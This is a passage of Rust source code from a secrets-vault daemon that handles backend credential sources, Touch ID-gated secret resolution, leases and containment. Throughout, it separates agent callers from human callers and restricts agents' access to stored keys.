    let bytes = serde_json::to_vec(&source.policy).expect("JSON policy");
    Sha256::digest(bytes)[..6].iter().map(|b| format!("{b:02x}")).collect()
}

fn source_retarget_prompt(old: &crate::backend::SourceConfig, new: &crate::backend::SourceConfig) -> Prompt {
    Prompt::RetargetSource { name: new.name.clone(), old_kind: old.kind.clone(), old_endpoint: old.endpoint.clone(),
        new_kind: new.kind.clone(), new_endpoint: new.endpoint.clone(),
        old_auth_method: old.auth_method.clone(), new_auth_method: new.auth_method.clone(),
        old_policy_digest: source_policy_digest(old), new_policy_digest: source_policy_digest(new),
        credential: if old.credential_revision == new.credential_revision { "unchanged" } else { "replaced" }.into() }
}

// No daemon State lock is held anywhere in this transaction. Approval is bound
// to a snapshot; the config lock and equality check prevent stale approval/ABA.
#[cfg(test)]
thread_local! {
    static BEFORE_SOURCE_LOCK: std::cell::RefCell<Option<Box<dyn FnOnce()>>> = const { std::cell::RefCell::new(None) };
}

/// Factory, credential file I/O, helper ECDH and crypto run without either RAM lock.
fn backend_binding(p: &Paths, st: &Ctx, peer: &agent::Peer, config: &crate::backend::SourceConfig, reference: &str)
    -> Result<(crate::backend::Binding, Arc<dyn crate::backend::SecretBackend>)> {
    use crate::backend::*;
    let backend = st.backends.registry.construct(config)?;
    let credential = (|| -> Result<Zeroizing<Vec<u8>>> {
        let file = store::load_secret(p, &config.credential_ref)?;
        let vault = peer_vault(p, peer)?;
        let deks = vault.unwrap_deks_local(std::slice::from_ref(&file), &Prompt::Unlock { names: reference.into() })?;
        crate::crypto::open(&deks[0], &file)
    })().map_err(|_| BackendError::NeedsHuman)?;
    let binding = Binding::new(config, backend.clone(), credential, st.backends.upstream_max_ttl)?;
    Ok((binding, backend))
}

/// Typed delivery seam for the CLI run path; never serialized onto the daemon socket.
/// The caller must preserve the verified Peer, and bound-run integration must add
/// command authorization plus whole-bundle redaction before using this seam.
pub(crate) fn resolve_values(p: &Paths, st: &Ctx, peer: &agent::Peer, reference: &str, selector: Option<&str>) -> Result<crate::backend::Delivery> {
    use crate::backend::*;
    crate::policy::enforce_args(p, &peer.caller, crate::policy::Action::Get, crate::policy::Subject::Secret(reference.into()), &json!({"selector":selector,"pid":peer.pid}))?;
    if peer.caller.is_agent() { bail!(BackendError::NeedsHuman); }
    let Reference::Backend(parsed) = BackendRef::parse(reference)? else { bail!(BackendError::InvalidRef); };
    // The Touch ID prompts name the reference and the helper cuts them at 120 characters:
    // refuse a longer one rather than let its tail go unseen.
    if crate::platform::helper::prompt_param(reference) != reference { bail!(BackendError::InvalidRef); }
    let config = store::load_config(p)?.sources.get(&parsed.source).cloned().ok_or(BackendError::NotFound)?;
    st.backends.registry.validate_kind(&config.kind).map_err(|_| BackendError::Unsupported)?;
    // No policy interpreter is installed yet: never silently ignore a configured
    // restriction. Only an empty policy object is accepted; anything else refuses.
    if !config.policy.as_object().is_some_and(|o| o.is_empty()) { bail!(BackendError::Unsupported); }
    // Kernel human-cache anchor tuple is interned without hashing/truncation. Unanchored
    // callers get a fresh identity per operation and therefore never a cache hit.
    let session_key = {
        let mut g = st.backends.runtime.lock().unwrap();
        if let Some(anchor) = peer.human_anchor() {
            if let Some(id) = g.sessions.get(&anchor) { *id } else {
                g.next_session = g.next_session.checked_add(1).ok_or(BackendError::Denied)?;
                let id = g.next_session;
                g.sessions.insert(anchor, id);
                id
            }
        } else {
            g.next_session = g.next_session.checked_add(1).ok_or(BackendError::Denied)?;
            g.next_session
        }
    };
    let session = SessionId::from_kernel(session_key);
    crate::audit::run(p, "daemon-backend-resolve", &[reference.into()], &peer.caller, json!({"source": parsed.source}), || {
        let at = st.backends.clock.now();
        let cached_grant = {
            let g = st.backends.runtime.lock().unwrap();
            g.grants.get(&(session_key, parsed.source.clone())).filter(|g| {
                g.reference == reference && g.expires > at.monotonic && g.expires_wall > at.wall
                    && selector.is_none_or(|s| s == format!("{:?}", g.id))
            }).map(|g| g.id)
        };
        if cached_grant.is_none() {
            crate::platform::helper::auth(&Prompt::Unlock { names: reference.into() })?;
        }
        if source_login_expired(st, &parsed.source) { bail!(BackendError::AuthExpired); }
        let existing = {
            let g = st.backends.runtime.lock().unwrap();
            g.sources.get(&parsed.source).filter(|r| r.config == config)
                .map(|r| (r.service.clone(), r.scopes.clone(), r.backend.clone()))
        };
        let (service, scopes, backend) = if let Some(runtime) = existing { runtime } else {
            let (binding, backend) = backend_binding(p, st, peer, &config, reference)?;
            let login_window = source_login_window(&binding, st.backends.clock.now());
            let scopes = Arc::new(BackendScopes::default());
            let service = Arc::new(BackendService::new(binding, st.backends.clock.clone(),
                Arc::new(BackendAudit { paths: p.clone(), caller: peer.caller.clone() }), scopes.clone()));
            // Serialize compare-and-insert with source transactions. The config lock
            // is separate from State; all disk reads precede taking Backends.
            let lock = store::lock_config(p)?;
            if lock.load()?.sources.get(&parsed.source) != Some(&config) { bail!(BackendError::BindingChanged); }
            let mut g = st.backends.runtime.lock().unwrap();
            if let Some(r) = g.sources.get(&parsed.source) {
                if r.config != config { bail!(BackendError::BindingChanged); }
                (r.service.clone(), r.scopes.clone(), r.backend.clone())
            } else {
                g.sources.insert(parsed.source.clone(), SourceRuntime { login_window, config: config.clone(), service: service.clone(), scopes: scopes.clone(), backend: backend.clone() });
                (service, scopes, backend)
            }
        };
        let native = backend.parse_ref(&parsed.native)?;
        let field = native.field.as_deref().unwrap_or("value");
        let grant = if let Some(grant) = cached_grant { grant } else {
            let grant = service.grant(session, Duration::from_secs(300))?;
            scopes.0.lock().unwrap().push((grant, session, native.issuance.clone(), field.into()));
            let at = st.backends.clock.now();
            st.backends.runtime.lock().unwrap().grants.insert((session_key, parsed.source.clone()), BackendGrant {
                id: grant, reference: reference.into(), expires: at.monotonic + Duration::from_secs(300), expires_wall: at.wall + 300,
            });
            grant
        };
        let delivery = service.resolve(ResolveRequest { grant, session, native: &parsed.native,
            selectors: &[field], cancelled: Arc::new(|| false) }).map_err(|e| {
                if e == BackendError::BindingChanged && source_login_expired(st, &parsed.source) { BackendError::AuthExpired } else { e }
            })?;
        if store::load_config(p)?.sources.get(&parsed.source) != Some(&config) {
            service.retarget(None);
            bail!(BackendError::BindingChanged);
        }
        Ok(delivery)
    })
}

fn source_mutation(p: &Paths, st: &Ctx, peer: &agent::Peer, req: Req) -> Result<Value> {
    use crate::backend::SourceConfig;
    fn revision() -> Result<String> {
        use rand::RngCore;
        let mut bytes = [0u8; 16];
        rand::rngs::OsRng.try_fill_bytes(&mut bytes)?;
        Ok(bytes.iter().map(|b| format!("{b:02x}")).collect())
    }
    let name = match &req {
        Req::SourceAdd { name, .. } | Req::SourceRetarget { name, .. } | Req::SourceRemove { name } => name.clone(),
        _ => unreachable!(),
    };
    store::validate_name(&name)?;
    let old = store::load_config(p)?.sources.get(&name).cloned();
    let path = format!("sources/{name}/cred");
    let (new, credential, prompt) = match req {
        Req::SourceAdd { kind, endpoint, auth_method, policy, credential, .. } => {
            anyhow::ensure!(old.is_none(), "source already exists");
            let source = SourceConfig { name: name.clone(), kind, endpoint, auth_method, policy,
                credential_ref: path.clone(), credential_revision: revision()?, generation: revision()? };
            let prompt = Prompt::AddSource { name: name.clone(), kind: source.kind.clone(), endpoint: source.endpoint.clone(), auth_method: source.auth_method.clone(), policy_digest: source_policy_digest(&source), credential: "replaced".into() };
            (Some(source), Some(credential), prompt)
        }
        Req::SourceRetarget { endpoint, credential, policy, .. } => {
            let previous = old.as_ref().context("no such source")?;
            let mut source = previous.clone();
            if let Some(endpoint) = endpoint { source.endpoint = endpoint; }
            if let Some(policy) = policy { source.policy = policy; }
            source.generation = revision()?;
            if credential.is_some() { source.credential_revision = revision()?; }
            let prompt = source_retarget_prompt(previous, &source);
            (Some(source), credential, prompt)
        }
        Req::SourceRemove { .. } => {
            let previous = old.as_ref().context("no such source")?;
            (None, None, Prompt::RemoveSource { name: name.clone(), kind: previous.kind.clone(), endpoint: previous.endpoint.clone(), auth_method: previous.auth_method.clone(), policy_digest: source_policy_digest(previous), credential: "unchanged".into() })
        }
        _ => unreachable!(),
    };
    if let Some(source) = &new {
        st.backends.registry.validate_kind(&source.kind)?;
        // The open core defines one generic credential type: a stored token.
        anyhow::ensure!(source.auth_method == "token", crate::backend::BackendError::InvalidConfig);
    }
    for source in old.iter().chain(new.iter()) {
        source.validate()?;
        for field in [&source.name, &source.kind, &source.endpoint, &source.auth_method] {
            anyhow::ensure!(crate::platform::helper::prompt_param(field) == *field && field.bytes().all(|b| (0x20..=0x7e).contains(&b)), "invalid source metadata");
        }
    }
    if let Some(value) = &credential { anyhow::ensure!(!value.0.is_empty(), "empty credential"); }
    let detail = json!({"name": name, "kind": new.as_ref().or(old.as_ref()).unwrap().kind,
        "old_binding_hash": old.as_ref().map(|s| s.binding_hash()).transpose()?,
        "new_binding_hash": new.as_ref().map(|s| s.binding_hash()).transpose()?});
    crate::audit::run(p, "source-mutation", std::slice::from_ref(&name.clone()), &peer.caller, detail, || {
    crate::platform::helper::auth(&prompt)?;
    let mut vault = peer_vault(p, peer)?;
    #[cfg(test)]
    if let Some(hook) = BEFORE_SOURCE_LOCK.with(|h| h.borrow_mut().take()) { hook(); }
    let lock = store::lock_config(p)?;
    let mut config = lock.load()?;
    anyhow::ensure!(config.sources.get(&name) == old.as_ref(), "source changed during approval");
    // Disable the old generation before publishing any disk replacement. A failed
    // transaction conservatively loses grants; retired services retain cleanup.
    let previous_runtime = st.backends.invalidate(&name);
    let new_config = new.clone();
    // Credential backups must use the recipient serialized by this same lock.
    vault.cfg = config.clone();
    let credential_path = p.secret(&path)?;
    let generation = new.as_ref().or(old.as_ref()).unwrap().generation.clone();
    if let Some(source) = new {
        // Preserve exact encrypted envelope bytes, not plaintext or a second path.
        let backup = if old.is_some() { Some(Zeroizing::new(std::fs::read(&credential_path)?)) }
            else { anyhow::ensure!(!credential_path.exists(), "orphan source credential exists"); None };
        if let Some(value) = &credential { vault.put_source_credential(&path, value.0.as_bytes())?; }
        config.sources.insert(name.clone(), source);
        if let Err(error) = lock.save(&config) {
            if credential.is_some() {
                if let Some(bytes) = backup { store::write_atomic(&credential_path, &bytes).context("credential rollback failed")?; }
                else { store::remove_secret(p, &path).context("credential rollback failed")?; }
            }
            return Err(error);
        }
    } else {
        config.sources.remove(&name);
        lock.save(&config)?;
        if credential_path.exists() { store::remove_secret(p, &path)?; }
    }
    drop(lock);
    // Rebind an existing service only after commit. Construction failure leaves
    // it disabled in retired cleanup, never usable with an old credential.
    if let (Some(mut runtime), Some(source)) = (previous_runtime, new_config)
        && let Ok((binding, backend)) = backend_binding(p, st, peer, &source, &source.credential_ref) {
        let lock = store::lock_config(p)?;
        if lock.load()?.sources.get(&name) == Some(&source) {
            runtime.login_window = source_login_window(&binding, st.backends.clock.now());
            runtime.service.retarget(Some(binding));
            runtime.config = source;
            runtime.backend = backend;
            let service = runtime.service.clone();
            let inserted = {
                let mut g = st.backends.runtime.lock().unwrap();
                if g.sources.contains_key(&name) { false } else {
                    g.retired.retain(|s| !Arc::ptr_eq(s, &service));
                    g.sources.insert(name.clone(), runtime);
                    true
                }
            };
            if !inserted { service.retarget(None); }
        }
    }
    crate::audit::log(p, crate::audit::Event { action: "source-mutation-result", secrets: std::slice::from_ref(&name),
        caller: &peer.caller, detail: json!({"generation": generation}), result: &Ok(()) })?;
    Ok(json!({"ok": true, "name": name, "generation": generation}))
    })
}

fn ensure_fixed_tool_name(name: &str) -> Result<()> {
    if name.is_empty() || name.len() > 64 || !name.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_') {
        bail!("invalid fixed tool name");
    }
    Ok(())
}

fn handle_effect(p: &Paths, st: &Ctx, peer: agent::Peer, req: Req, http_port: u16) -> Result<Value> {
    // Capability fence: the daemon's lookup is authoritative. The caller is the
    // kernel-derived Peer, never a wire claim. Nothing below runs for a fenced verb.
    if let Some(verb) = crate::fence::request_verb(&req) {
        crate::fence::require_human(&peer.caller, verb, crate::fence::Layer::Daemon)?;
    }
    match &req {
        Req::Unlock { names, .. } | Req::HumanUnlock { names } | Req::GrantLease { names, .. } | Req::Use { names, .. } => {
            for name in names { store::require_generic_name(name)?; }
        }
        Req::Copy { name } => store::require_generic_name(name)?,
        Req::LaunchPrepare { refs, .. } => { for name in refs { store::require_generic_name(name)?; } }
        _ => {}
    }
    match req {
        Req::ProfileTrust { path } => {
            crate::policy::profile::trust(p, &peer.caller, std::path::Path::new(&path))?;
            Ok(json!({"ok":true}))
        }
        Req::ProfileRead { path } => crate::policy::profile::read(p, &peer.caller, std::path::Path::new(&path)),
        Req::Kill { agent, session, all, revive } => {
            if usize::from(agent.is_some()) + usize::from(session.is_some()) + usize::from(all) != 1
                || agent.iter().chain(session.iter()).any(|s| s.is_empty() || crate::platform::helper::prompt_param(s) != *s) {
                bail!("choose exactly one of --agent, --session, --all");
            }
            // Both transitions require human presence, not just non-detection.
            let key = format!("{} {}", if revive { "revive" } else { "kill" }, agent.as_ref().or(session.as_ref()).map_or("all", String::as_str));
            if crate::platform::helper::prompt_param(&key) != key { bail!("containment target too long"); }
            crate::platform::helper::auth(&Prompt::ChangeConfig { key })?;
            let lock = store::lock_config(p)?;
            let mut cfg = lock.load()?;
            let killed = cfg.killed.get_or_insert_with(Default::default);
            if all { *killed = crate::policy::Killed { all: !revive, ..Default::default() }; }
            if let Some(kind) = agent { if revive { killed.agents.remove(&kind); } else { killed.agents.insert(kind); } }
            if let Some(label) = session { if revive { killed.sessions.remove(&label); } else { killed.sessions.insert(label); } }
            lock.save(&cfg)?;
            let mut g = st.lock().unwrap();
            g.killed = cfg.killed.clone().unwrap_or_default();
            if !revive {
                // Conservative containment also burns unrelated outstanding grants.
                g.lease_revision += 1;
                g.leases.clear();
                g.aws.clear();
                g.pending_launches = Default::default();
                g.launch_redactions.clear();
                g.redaction_feeds.clear();
                g.unredacted_approvals.clear();
            }
            Ok(json!({"ok":true}))
        }
        Req::Call { tool, args } => {
            ensure_fixed_tool_name(&tool)?;
            crate::policy::enforce_args(p, &peer.caller, crate::policy::Action::Call, crate::policy::Subject::Tool(tool.clone()), &json!({"args":args,"pid":peer.pid}))?;
            let v = peer_vault(p, &peer)?;
            let definition = v.cfg.tools.get(&tool).context("unknown fixed tool")?;
            definition.validate(&args)?;
            // A credential cannot be registered against multiple destinations.
            if v.cfg.tools.values().any(|other| other.credential_ref == definition.credential_ref
                && (other.host != definition.host || other.port != definition.port)) {
                bail!("fixed tool credential has conflicting host bindings");
            }
            let file = store::load_secret(p, &definition.credential_ref)?;
            // Tool calls never redeem leases (especially command-scoped leases).
            if crate::run_authorization(&peer.caller, &file, false, false) == crate::RunAuthorization::Deny {
                bail!("fixed tool access denied by credential policy");
            }
            crate::audit::log(p, crate::audit::Event { action: "fixed-call-decision", secrets: &[], caller: &peer.caller,
                detail: json!({"tool": tool, "decision": "allow", "host": definition.host}), result: &Ok(()) })?;
            let call_hash = crate::policy::approval::binding(&[tool.as_bytes(), &serde_json::to_vec(&args)?, &serde_json::to_vec(definition)?]);
            let values = v.unlock_internal("fixed-call-credential", std::slice::from_ref(&definition.credential_ref),
                Some(&format!("fixed tool {tool} {}", crate::policy::hex(&call_hash))), false,
                |req| {
                    if peer.caller.is_agent() && matches!(req, Req::Use { .. }) {
                        return Ok(json!({"deks": {}, "denied": {}}));
                    }
                    handle_as(p, st, peer.clone(), req, http_port, None, Ok)
                })?;
            let credential = values.first().context("fixed tool credential unavailable")?;
            if values.len() != 1 || credential.name != definition.credential_ref { bail!("fixed tool requires exact credential"); }
            let check_binding = || -> Result<()> {
                check_agent_access(p, st, &peer.caller)?;
                if store::load_config(p)?.tools != v.cfg.tools
                    || serde_json::to_vec(&store::load_secret(p, &definition.credential_ref)?)? != serde_json::to_vec(&file)? {
                    bail!("fixed tool binding changed");
                }
                Ok(())
            };
            check_binding()?;
            let body = crate::broker::fixed::call(definition, &args, &credential.value)?;
            // Discard results if config or encrypted credential/policy changed during HTTP.
            check_binding()?;
            crate::audit::log(p, crate::audit::Event { action: "fixed-call-dispense", secrets: &[], caller: &peer.caller,
                detail: json!({"tool": tool, "bytes": body.len()}), result: &Ok(()) })?;
            Ok(json!({"body": body}))
        }
        req @ (Req::SourceAdd { .. } | Req::SourceRemove { .. } | Req::SourceRetarget { .. }) => source_mutation(p, st, &peer, req),
        Req::Resolve { reference, grant, .. } => {
            let values = resolve_values(p, st, &peer, &reference, grant.as_deref())?;
            drop(values); // SecretField buffers zeroize here; never socket values.
            let crate::backend::Reference::Backend(parsed) = crate::backend::BackendRef::parse(&reference)? else { bail!(crate::backend::BackendError::InvalidRef); };
            Ok(json!({"ok": true, "source": parsed.source, "ref": reference}))
        }
        Req::SourceList => {
            let config = store::load_config(p)?;
            let sources: Vec<_> = config.sources.values().map(|source| json!({
                "name": source.name, "kind": source.kind, "endpoint": source.endpoint,
                "auth_method": source.auth_method, "generation": source.generation,
            })).collect();
            Ok(json!({"ok": true, "sources": sources}))
        }
        Req::Add { name, value, tier, agent_allowed, public, overwrite } => {
            let v = peer_vault(p, &peer)?;
            let value = zeroize::Zeroizing::new(B64.decode(&value)?);
            Ok(serde_json::to_value(v.add_internal(&name, &value, tier, agent_allowed, public, overwrite,
                |req| handle_as(p, st, peer.clone(), req, http_port, None, Ok))?)?)
        }
        Req::ChangePolicy { patterns, tier, agent_allowed, public } => {
            let v = peer_vault(p, &peer)?;
            Ok(serde_json::to_value(v.set_policy_internal(&patterns, tier, agent_allowed, public,
                |req| handle_as(p, st, peer.clone(), req, http_port, None, Ok))?)?)
        }
        Req::Delete { patterns } => {
            let v = peer_vault(p, &peer)?;
            Ok(serde_json::to_value(v.remove_internal(&patterns,
                |req| handle_as(p, st, peer.clone(), req, http_port, None, Ok))?)?)
        }
        Req::ChangeConfig { key, value } => {
            peer_vault(p, &peer)?.set_config_internal(&key, &value)?;
            Ok(json!({"ok": true}))
        }
        Req::UpgradeKeys => Ok(serde_json::to_value(peer_vault(p, &peer)?.upgrade_keys_internal()?)?),
        Req::Recover { identity_text } => {
            Ok(serde_json::to_value(peer_vault(p, &peer)?.recover_internal(&identity_text)?)?)
        }
        Req::RecoverFromPaper { identity_text, accept_loss } => {
            Ok(serde_json::to_value(peer_vault(p, &peer)?.recover_from_paper_internal(&identity_text, &accept_loss)?)?)
        }
        Req::RetireKeysWithPaper { identity_text } => {
            Ok(serde_json::to_value(peer_vault(p, &peer)?.retire_keys_with_paper_internal(&identity_text)?)?)
        }
        Req::RetireKeys => Ok(serde_json::to_value(peer_vault(p, &peer)?.retire_keys_internal()?)?),
        Req::RotateBackup { recipient } => Ok(serde_json::to_value(peer_vault(p, &peer)?.rotate_backup_internal(&recipient)?)?),
        Req::SsoPortalAdd { name, start_url, region } => {
            peer_vault(p, &peer)?.sso_portal_add_internal(&name, &start_url, &region)?;
            Ok(json!({"ok": true}))
        }
        Req::SsoPortalLimit { .. } => unreachable!("classified with delivery in handle_as"),
        Req::RefreshSsoRegistrations { names } => {
            let v = peer_vault(p, &peer)?;
            v.sso_sync_internal(&names, |req| handle_as(p, st, peer.clone(), req, http_port, None, Ok))?;
            Ok(json!({"ok": true}))
        }
        Req::CompleteSsoLogin { session } => {
            let v = peer_vault(p, &peer)?;
            let (_, portal) = v.sso_portal(Some(&session.portal))?;
            if session.start_url != portal.start_url || session.region != portal.region {
                bail!("SSO portal changed; retry login");
            }
            let profiles = v.sso_regs_internal(None, Some(&session.portal))?;
            handle_as(p, st, peer.clone(), Req::SsoSet { session, profiles, limit_minutes: portal.limit_minutes }, http_port, None, Ok)
        }
        Req::Copy { name } => {
            let v = peer_vault(p, &peer)?;
            // Resolve exactly one stored name, not a pattern or client plaintext.
            store::load_secret(p, &name)?;
            let values = v.unlock_internal("copy", std::slice::from_ref(&name), None, true,
                |req| handle_as(p, st, peer.clone(), req, http_port, None, Ok))
                .map_err(|e| legacy_unlock_error(p, st, &peer, std::slice::from_ref(&name), e))?;
            let value = values.first().context("missing copy value")?;
            // The clipboard is readable by the agent: same rule as the values themselves.
            if peer.caller.is_agent() && crate::aws::is_aws_entry(&value.name) && crate::aws::session_mint_enabled(&value.value) {
                bail!(SESSION_MINT_REFUSAL);
            }
            crate::platform::helper::clip(&value.value, v.cfg.clip_seconds)
                .context("daemon clipboard unavailable; no client fallback")?;
            Ok(json!({"copied": [value.name], "clears_in": v.cfg.clip_seconds}))
        }
        Req::Unlock { names, action, context, cmd, gate_open, sso_profile, ttl } => {
            if sso_profile.is_some() && action != UnlockAction::Run { bail!("SSO endpoint requires run"); }
            if action == UnlockAction::Copy {
                if names.len() != 1 { bail!("Copy requires exactly one stored name"); }
                return handle_as(p, st, peer.clone(), Req::Copy { name: names[0].clone() }, http_port, None, Ok);
            }
            let mut v = peer_vault(p, &peer)?;
            v.run_cmd = cmd;
            let gate_open = gate_open || matches!(action, UnlockAction::Get | UnlockAction::Reveal | UnlockAction::Copy);
            let values = v.unlock_internal(action.label(), &names, context.as_deref(), gate_open,
                |req| handle_as(p, st, peer.clone(), req, http_port, None, Ok))
                .map_err(|e| legacy_unlock_error(p, st, &peer, &names, e))?;
            // Same rule for a requesting agent: session_mint keys are never handed out as values,
            // whatever action it names. `aws-describe` is caller-selected, so it gets only the
            // metadata the describe output prints (masked key id, no secret), never the key.
            let mut values = values;
            if peer.caller.is_agent() {
                for u in values.iter_mut().filter(|u| crate::aws::is_aws_entry(&u.name) && crate::aws::session_mint_enabled(&u.value)) {
                    if action != UnlockAction::AwsDescribe {
                        bail!(SESSION_MINT_REFUSAL);
                    }
                    u.value = crate::aws::describe_only(&u.value)?;
                }
            }
            let endpoint = if let Some(name) = sso_profile {
                let u = values.iter().find(|u| u.name == name).context("SSO profile not unlocked")?;
                match crate::sso::parse_entry(&u.value)? {
                    crate::sso::AwsEntry::Sso(_) => Some(handle_as(p, st, peer.clone(), Req::SsoOpen {
                        name, dek: Some(B64.encode(u.dek.as_ref())), ttl,
                    }, http_port, None, Ok)?),
                    crate::sso::AwsEntry::Static(_) => None,
                }
            } else { None };
            Ok(json!({"values": values.iter().map(|u| json!({"name":u.name,"value":B64.encode(&u.value),"public":u.public})).collect::<Vec<_>>(), "endpoint":endpoint}))
        }
        Req::RunUnredacted { command } => {
            crate::platform::helper::auth(&Prompt::RunUnredacted { command: command.clone() })?;
            // Remember the approval for the matching LaunchPrepare of this same owner: the
            // endpoint's lifetime flag must come from it, not from a frame left untaken.
            let owner = agent::process_identity(peer.pid)?;
            let mut g = st.lock().unwrap();
            g.unredacted_approvals.retain(|(_, _, until)| *until > now());
            if g.unredacted_approvals.len() >= UNREDACTED_APPROVAL_CAPACITY { g.unredacted_approvals.remove(0); }
            g.unredacted_approvals.push((owner, command, now() + UNREDACTED_APPROVAL_SECONDS));
            Ok(json!({"ok":true}))
        }
        Req::Ping => Ok(json!({"ok": true, "pid": std::process::id(), "build_id": build_id(), "policy_sha256": loaded_policy_sha256(st)})),
        Req::Init { backup_recipient } => init_vault(&mut peer_vault(p, &peer)?, backup_recipient),
        Req::StatusSelftest => {
            let mut status = vault_status(&peer_vault(p, &peer)?)?;
            // Additive: older clients ignore it, newer clients tell an older daemon by its absence.
            status["daemon"] = json!({"build_id": build_id(), "policy_sha256": loaded_policy_sha256(st)});
            Ok(status)
        }
        Req::PubKeys => {
            let cached = crate::platform::helper::pubkeys_cached(&p.pubkeys());
            let pk = match cached {
                Ok(pk) if pk.agent.is_some() || !p.has_agent_key() => pk,
                _ => crate::platform::helper::pubkeys(&p.keys())?,
            };
            Ok(pk.to_json())
        }
        Req::HelperPin { stage_daemon, stage_helper } => {
            Ok(serde_json::to_value(crate::platform::helper::pin_current(match (&stage_daemon, &stage_helper) {
                (Some(d), Some(h)) => Some((d.as_path(), h.as_path())),
                (None, None) => None,
                _ => bail!("both --stage-daemon and --stage-helper are required"),
            })?)?)
        }
        Req::Shutdown => {
            let _ = std::fs::remove_file(sock_path(p));
            std::thread::spawn(|| {
                std::thread::sleep(Duration::from_millis(50));
                std::process::exit(0)
            });
            Ok(json!({"ok": true}))
        }
        Req::Grant { .. } => bail!("client-supplied DEKs are refused; use GrantLease or HumanUnlock"),
        Req::HumanUnlock { names } => {
            let revision = st.lock().unwrap().lease_revision;
            let cfg = store::load_config(p)?;
            let files = names.iter().map(|name| store::load_secret(p, name)).collect::<Result<Vec<_>>>()?;
            if files.iter().any(|f| f.tier != store::Tier::Bio) {
                bail!("human unlock requires Bio secrets");
            }
            let v = crate::Karambit { paths: p.clone(), cfg: cfg.clone(), caller: peer.caller.clone(), run_cmd: None };
            let deks = v.unwrap_deks_local(&files, &Prompt::Unlock { names: approval_names(&names)? })?;
            for (f, dek) in files.iter().zip(&deks) { crate::crypto::open(dek, f)?; }
            let anchor = peer.human_anchor();
            let hours = cfg.human_lease_hours.clamp(0.0, 3.0);
            let mut response = serde_json::Map::new();
            let mut g = st.lock().unwrap();
            check_lease_snapshot(p, &g, revision, &files)?;
            for (f, dek) in files.iter().zip(deks) {
                response.insert(f.name.clone(), json!(B64.encode(dek.as_ref())));
                if let Some((pid, start)) = anchor.filter(|_| hours > 0.0 && !f.agent_allowed && !f.is_public()) {
                    let expires = now() + (hours * 3600.0).round() as u64;
                    let info = LeaseInfo { name: f.name.clone(), to: Grantee::Human,
                        to_label: format!("human anchor pid:{pid}@{start}"), granted: now(), expires,
                        remaining: expires.saturating_sub(now()), by: format!("peer pid:{}", peer.pid) };
                    g.human.insert((pid, start, f.name.clone()), Held { info, dek, root: Some((pid, start)), scope: Scope::default(), uses: 0 });
                }
            }
            Ok(json!({"deks": response, "anchor": anchor}))
        }
        Req::GrantLease { names, grantee, hours, mut scope } => {
            let revision = st.lock().unwrap().lease_revision;
            if !(hours > 0.0 && hours <= crate::lease::MAX_HOURS) { bail!("invalid lease hours"); }
            let root = match &grantee {
                Grantee::Human => bail!("human caches require HumanUnlock"),
                Grantee::Session(s) => Some(crate::resolve_session_root(s)?),
                Grantee::Kind(k) if k.is_empty() || !k.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_') => bail!("invalid agent kind"),
                _ => None,
            };
            if let Some(cwd) = &scope.cwd {
                let canon = canon_dir(cwd);
                if !Path::new(&canon).is_dir() { bail!("invalid scope directory"); }
                scope.cwd = Some(canon);
            }
            if scope.max_uses == Some(0) { bail!("invalid lease scope"); }
            scope.cmds = scope.cmds.iter().map(CommandBinding::pin).collect::<Result<_>>()?;
            let cfg = store::load_config(p)?;
            let files = names.iter().map(|name| store::load_secret(p, name)).collect::<Result<Vec<_>>>()?;
            let files: Vec<_> = files.into_iter().filter(|f| !f.is_public()).collect();
            if files.is_empty() { bail!("nothing to lease"); }
            // Refuse before any prompt: names, grantee and scope are all approved on screen,
            // and the helper cuts each field at 120 characters.
            let (grantee_label, scope_label) = (grantee.label(), scope.label());
            if [&grantee_label, &scope_label].iter().any(|f| crate::platform::helper::prompt_param(f) != **f) {
                bail!("lease scope too long for one prompt; grant fewer scripts or commands");
            }
            // Public secrets are skipped above; the prompt names exactly what is leased.
            let leased: Vec<String> = files.iter().map(|f| f.name.clone()).collect();
            let reason = Prompt::Grant { names: approval_names(&leased)?, grantee: grantee_label, hours: hours.to_string(), scope: scope_label };
            if !files.iter().any(|f| f.tier == store::Tier::Bio) { crate::platform::helper::auth(&reason)?; }
            let v = crate::Karambit { paths: p.clone(), cfg, caller: peer.caller.clone(), run_cmd: None };
            let deks = v.unwrap_deks_local(&files, &reason)?;
            for (f, dek) in files.iter().zip(&deks) { crate::crypto::open(dek, f)?; }
            let mut g = st.lock().unwrap();
            check_lease_snapshot(p, &g, revision, &files)?;
            let mut out = vec![];
            for (f, dek) in files.into_iter().zip(deks) {
                let expires = now() + (hours * 3600.0).round() as u64;
                let info = LeaseInfo { name: f.name.clone(), to_label: grantee.label(), to: grantee.clone(), granted: now(), expires,
                    remaining: expires.saturating_sub(now()), by: format!("peer pid:{}", peer.pid) };
                out.push(LeaseView { info: info.clone(), scope: scope.clone(), uses: 0 });
                g.leases.insert(f.name, Held { info, dek, root, scope: scope.clone(), uses: 0 });
            }
            Ok(json!({"leases": out}))
        }
        Req::Use { names, cmd } => {
            for name in &names {
                crate::policy::enforce_args(p, &peer.caller, crate::policy::Action::Run, crate::policy::Subject::Secret(name.clone()), &json!({"names":names,"cmd":cmd,"pid":peer.pid}))?;
            }
            if !peer.caller.is_agent() {
                // Human self-leases: "Only me + Touch ID" secrets, no scope. Dead while
                // locked (probe the WhenUnlocked open key), and cleared on lock.
                // A remote (SSH) caller is not provably the human at the keyboard.
                if crate::ssh_without_human(&peer.caller) { return Ok(json!({"deks": {}, "denied": {}})); }
                if !check_human_cache_screen(p, st) { return Ok(json!({"deks": {}, "denied": {}})); }
                let mut g = st.lock().unwrap();
                let mut deks = serde_json::Map::new();
                for n in &names {
                    if let Some(key) = human_cache_key(&g, &peer, n) {
                        let h = g.human.get_mut(&key).expect("validated cache key");
                        h.uses += 1;
                        deks.insert(n.clone(), json!(B64.encode(h.dek.as_ref())));
                    }
                }
                return Ok(json!({"deks": deks, "denied": {}}));
            }
            let cwd = peer.cwd_abs().map(|c| canon_dir(&c));
            // Snapshot scope metadata only; legacy Use never reads a claimed target.
            let (scopes, revision): (HashMap<_, _>, _) = {
                let g = st.lock().unwrap();
                (names.iter().filter_map(|n| g.leases.get(n).map(|h| (n.clone(), h.scope.clone()))).collect(), g.lease_revision)
            };
            // The DEK opens the file on disk, so releasing it releases the long-lived key of a
            // session_mint profile. Those run only through `karambit aws`, which spends the
            // lease inside the daemon. File I/O stays outside State; unreadable = refused.
            let session_mint = session_mint_leases(p, st, &names);
            #[cfg(test)]
            USE_SCOPE_HOOK.with(|h| { if let Some(hook) = h.borrow_mut().take() { hook(); } });
